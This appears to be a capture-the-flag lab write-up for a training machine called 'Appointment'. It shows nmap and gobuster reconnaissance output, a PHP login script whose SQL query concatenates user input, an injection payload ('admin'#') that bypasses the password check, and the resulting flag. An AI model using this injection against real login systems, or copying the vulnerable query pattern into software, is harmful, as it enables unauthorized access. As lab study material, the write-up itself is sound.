# Appointment

TARGET MACHINE IP ADDRESS
10.129.183.69

----

## Nmap, Initial

```
nmap -Pn 10.129.183.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 13:04 EST
Nmap scan report for 10.129.183.69
Host is up (0.052s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds


nmap -Pn -p 1-10000 10.129.183.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 13:04 EST
Nmap scan report for 10.129.183.69
Host is up (0.055s latency).
Not shown: 9999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 5.24 seconds

```

## Nmap, Details

```
nmap -Pn -sS -sV -sC -O -p 80 10.129.183.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 13:05 EST
Nmap scan report for 10.129.183.69
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 5.4 (93%), Linux 3.1 (92%), Linux 3.2 (92%), Linux 4.15 - 5.8 (90%), Linux 3.10 (90%), ASUS RT-N56U WAP (Linux 3.4) (90%), Linux 3.16 (90%), Linux 5.3 - 5.4 (90%), Linux 2.6.32 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds
```

## Browser

![Pasted image 20240221120753](https://github.com/GregKedrovsky/Hacking/assets/26492233/31ed6458-c088-4f4f-9df8-f21d514c8956)

## Directory Busting

```
gobuster dir -r -u 10.129.183.69 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.183.69
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 200) [Size: 1124]
/fonts                (Status: 200) [Size: 1348]
/images               (Status: 200) [Size: 1132]
/index.php            (Status: 200) [Size: 4896]
/js                   (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 278]
/vendor               (Status: 200) [Size: 2576]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

## SQL Injection

### Based on the following PHP loginroutine:

```
<?php
mysql_connect("localhost", "db_username", "db_password"); 
# Connection to the SQL Database.

mysql_select_db("users"); 
# Database table where user information is stored.

$username=$_POST['username']; # User-specified username.
$password=$_POST['password']; # User-specified password.

$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
# Query for user/pass retrieval from the DB.

$result=mysql_query($sql);
# Performs query stored in $sql and stores it in $result.

$count=mysql_num_rows($result);
# Sets the $count variable to the number of rows stored in $result.

if ($count==1){
# Checks if there's at least 1 result, and if yes:
$_SESSION['username'] = $username; # Creates a session with the specified $username.
$_SESSION['password'] = $password; # Creates a session with the specified $password.
header("location:home.php"); # Redirect to homepage.
}

else { # If there's no singular result of a user/pass combination:
	header("location:login.php");
	# No redirection, as the login failed in the case the $count variable
	# is not equal to 1, HTTP Response code 200 OK.
}
?>
```

Notice the `$sql` variable. This is the SQL query statement built from the two user inputs on the home screen.

```
$username=$_POST['username']; # User-specified username.
$password=$_POST['password']; # User-specified password.

$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
# Query for user/pass retrieval from the DB.
```

Problem: The SQL query would be complete and valid if we ended it at '$username`
- We can do that by adding a `' #` to the end of the `admin` username (effectively commenting everything else out on the line and providing a truncated query statement with no password.)
- I tried it with a blank password, but it failed (because the `$password` variable is before the query statement in the PHP code above) .
- Put anything in the password field, and it works.

![Pasted image 20240221124943](https://github.com/GregKedrovsky/Hacking/assets/26492233/06c3edb9-4274-41c4-9ba4-a21eea1282f2)

That results in the following SQL query (assuming "x" for the password):
```
SELECT * FROM users WHERE username='admin'#' AND password='x'
# The password check is effectively commented out
```

The following page loads: 

![Pasted image 20240221125036](https://github.com/GregKedrovsky/Hacking/assets/26492233/c4912336-4e5d-4778-8780-a5e623d575c2)

Congratulations!
Your flag is: e3d0796d002a446c0e622226f42e9672

![Pasted image 20240221125154](https://github.com/GregKedrovsky/Hacking/assets/26492233/011acdca-2517-4b83-92b3-477667fb4861)


